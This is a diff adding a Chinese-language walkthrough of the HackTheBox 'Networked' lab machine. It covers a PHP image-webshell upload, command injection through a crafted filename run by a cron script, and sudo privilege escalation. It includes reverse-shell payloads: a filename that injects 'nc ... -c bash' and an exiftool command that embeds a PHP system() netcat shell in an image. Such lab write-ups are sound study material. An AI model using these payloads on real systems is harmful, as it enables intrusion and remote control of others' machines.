@@ -190,3 +190,51 @@ Paper：[Write-ups for 0xrick's hack-the-box](https://0xrick.github.io/categorie
 - John：默认自带一些服务秘钥转HASH的脚本，kali的在/usr/share/john目录下。
 - SSH代理：也可以利用SSH设置代理，`ssh -D 1080 -fN -i bobby.key.enc bobby@chainsaw.htb`
 - 这是一个关于智能合约的漏洞环境，从智能合约的定义、编写、编译、部署到交互，可以拓展学习不少有趣的东西。
+
+### 九、Networked
+
+环境概述：Linux、Easy、20'、24 Aug 2019
+
+渗透流程：Nmap -> Web Enumeration -> RCE –> Shell as apache -> Command Injection in check_attack.php –> Shell as guly –> User Flag -> Command Injection in the Network Script Name –> Root Shell –> Root Flag
+
+知识点：
+
+- 信息泄露：使用gobuster枚举目录，发现备份文件。
+
+- tar：解压缩`tar zxvf backup.tar `，压缩`tar zcvf test.tar file1 file2`。
+
+- GetShell：制作图片马，重命名为test.php.png，上传并触发RCE，获取apache shell。
+
+- GetShell：guly用户家目录存在定时任务，每三分钟执行某PHP文件，内含RCE code，`exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");`，$value参数可控且为指定目录下的文件名，使用touch可新建名为`'; nc 10.10.xx.xx 1338 -c bash'`文件，将代码注入并执行，触发RCE，获取guly shell。
+
+- Linux提权：使用`sudo -l`查看当前用户可以使用sudo的范围情况，如下显示guly可以以root权限调用changename.sh，`sudo ./usr/local/sbin/changename.sh`；此文件是设置网络配置的脚本，参考[exp](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)从而提权。
+
+  ```
+  User guly may run the following commands on networked:
+      (root) NOPASSWD: /usr/local/sbin/changename.sh
+  ```
+
+思考：
+
+- 代码审计：作者并没有解释为何上传特殊文件导致RCE的。这里是由于lib.php文件的getnameUpload()函数使用了implode()获取文件后缀，导致可以上传`.php.png`后缀的文件，使用`php -a`获得交互来测试，如下；RCE是PHP和Apache配置错误引发的问题，将`.php*`的文件按php执行，参考[paper](https://blog.remirepo.net/post/2013/01/13/PHP-and-Apache-SetHandler-vs-AddHandler)。
+
+  ```
+  php > $filename="image.php.png";
+  php > $pieces = explode('.',$filename); print_r($pieces);
+  Array
+  (
+      [0] => image
+      [1] => php
+      [2] => png
+  )
+  php > $name= array_shift($pieces); echo $name;
+  image
+  php > $name = str_replace('_','.',$name); echo $name;
+  image
+  php > $ext = implode('.',$pieces); echo $ext;
+  php.png
+  ```
+
+- 图片马：制作图片马，文中直接使用的`echo >>`追加，同样原理Windows下使用`copy`来追加，或使用010editor等二进制编辑器来追加，但这些都可能涉及图片完整性问题；可以使用exiftool，`exiftool -Comment='<?php system("nc 10.10.14.4 1337 -e /bin/bash"); ?>' test.php.png`，保持图片完整性。
+- 定时任务：家目录下的crontab.guly默认不能触发定时器，定时器服务名为`crond`，日志在`/var/log/cron`。
+- Linux网卡设置：如果直接修改网络配置文件，即ifcfg-ethx等文件话，必须通过ifup/ifdown来启动/关闭；CentOS系网络配置文件所在目录`/etc/sysconfig/network-scripts/`，Ubuntu系`/etc/network/interfaces/`。
